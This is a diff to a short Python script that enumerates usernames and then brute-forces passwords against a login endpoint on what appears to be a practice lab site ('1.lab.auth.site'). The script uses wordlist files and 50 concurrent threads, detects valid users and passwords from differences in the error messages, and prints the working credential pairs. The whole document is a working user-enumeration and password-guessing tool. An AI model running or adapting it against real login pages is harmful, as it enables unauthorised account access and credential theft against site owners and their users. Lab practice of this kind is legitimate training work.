@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
-# Does need a 'names.txt' and a 'password.txt' file
 
 import requests
 import concurrent.futures
 
 names = []
 password = []
+found_names = []
+found_combo = []
 
 
 with open('names.txt','r') as f:
@@ -16,21 +17,39 @@ with open('password.txt','r') as p:
 	for line in p:
 		password.append(line.strip())
 
-def makeReq(name='',password='',method=0):
+def makeReq(name='',password='',method=""):
 	r = requests.get(f"http://1.lab.auth.site/ajax.php?fun=login&username={name}&password={password}")
 
-	if r.text.find("Login failed ") == -1 :
-		print(f"Found username: {name} and Password: {password} code: {r.text.find('invalid')}")
+	if method == "name_method" and r.text.find("invalid user") == -1 :
+		print(f"Found username: {name} ")
+		found_names.append(name)
 
-def passguess(rname): # Fuction is needed if you are doing multiple user and password guesses at a the same time.
-	for line in password:
-		makeReq(name=rname,password=line)
+	if method == "password_method" and r.text.find("invalid password") == -1:
+		print(f"Found Creds: {name}:{password}")
+		found_combo.append(f"{name}:{password}")
 
 
-with concurrent.futures.ThreadPoolExecutor(100) as executor:  # THIS TOOK ME HOURS.
-	results = executor.map(passguess,names)
+def passguess(password): # THIS ONE THING FIXES A PROBLEM I ALMOST KILLED MYSELF OVER
+	for line in found_names:
+		makeReq(name=line,password=password,method="password_method")
 
-print(f"Querys made:{Query}")
+def userguess(fname):
+	makeReq(name=fname,method="name_method")
+
+
+with concurrent.futures.ThreadPoolExecutor(50) as executor:  # THIS TOOK ME HOURS.
+	results = executor.map(userguess,names)
+
+print(f"Attempting Password attacks on the following users: {found_names}")
+
+with concurrent.futures.ThreadPoolExecutor(50) as executor:  # Because there are more passwords then found users, make threads based off passwords.
+	results = executor.map(passguess,password)
+
+print(found_combo)
+
+
+
+
 
 # https://www.youtube.com/watch?v=IEEhzQoKtQU - Threading
 
